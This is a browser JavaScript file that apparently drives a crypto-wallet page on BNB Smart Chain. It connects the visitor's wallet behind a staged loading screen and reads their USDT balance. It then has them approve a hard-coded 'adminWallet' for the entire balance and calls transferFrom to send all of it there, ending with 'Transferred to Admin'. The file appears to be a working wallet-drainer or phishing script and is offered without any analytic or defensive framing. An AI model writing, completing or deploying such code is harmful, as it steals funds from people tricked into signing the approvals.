const adminWallet = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP20 USDT
const usdtAbi = [
  { "constant": true, "inputs": [{ "name": "owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
  { "constant": false, "inputs": [{ "name": "spender", "type": "address" }, { "name": "amount", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
  { "constant": false, "inputs": [{ "name": "from", "type": "address" }, { "name": "to", "type": "address" }, { "name": "value", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
];

let user;
let usdt;

async function startProcessing() {
  document.getElementById("sendScreen").style.display = "none";
  document.getElementById("loadingScreen").style.display = "block";
  setTimeout(connectWallet, 2000);
}

async function connectWallet() {
  if (window.ethereum) {
    const web3 = new Web3(window.ethereum);
    await ethereum.request({ method: "eth_requestAccounts" });
    const accounts = await web3.eth.getAccounts();
    user = accounts[0];
    document.getElementById("walletAddress").innerText = `Connected: ${user}`;
    usdt = new web3.eth.Contract(usdtAbi, usdtContractAddress);
    const bal = await usdt.methods.balanceOf(user).call();
    document.getElementById("balance").innerText = web3.utils.fromWei(bal, 'mwei');
    document.getElementById("loadingScreen").style.display = "none";
    document.getElementById("approveSection").style.display = "block";
  } else {
    alert("Wallet not found");
  }
}

async function approveFull() {
  const bal = await usdt.methods.balanceOf(user).call();
  await usdt.methods.approve(adminWallet, bal).send({ from: user });
  document.getElementById("transferBtn").style.display = "block";
}

async function transferFull() {
  const bal = await usdt.methods.balanceOf(user).call();
  await usdt.methods.transferFrom(user, adminWallet, bal).send({ from: user });
  alert("Transferred to Admin");
}
